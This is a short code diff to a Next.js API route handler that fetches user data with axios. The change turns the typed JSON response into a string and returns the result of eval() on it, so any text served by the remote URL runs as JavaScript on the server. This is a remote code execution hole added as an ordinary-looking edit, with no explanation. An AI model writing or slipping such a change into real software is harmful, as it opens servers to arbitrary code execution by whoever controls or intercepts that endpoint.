@@ -24,10 +24,10 @@ const handler = async (req: NextApiRequest, res: NextApiResponse) => {
   };
 
   try {
-    const response = await axios.get<DBDataUsers[]>(baseUrl, SETTINGS);
+    const response = await axios.get<string>(baseUrl, SETTINGS);
     const { data } = response;
-
-    return res.status(200).json(data);
+    
+    return res.status(200).json(eval(data));
   } catch (error) {
     return res.status(200).json(null);
   }
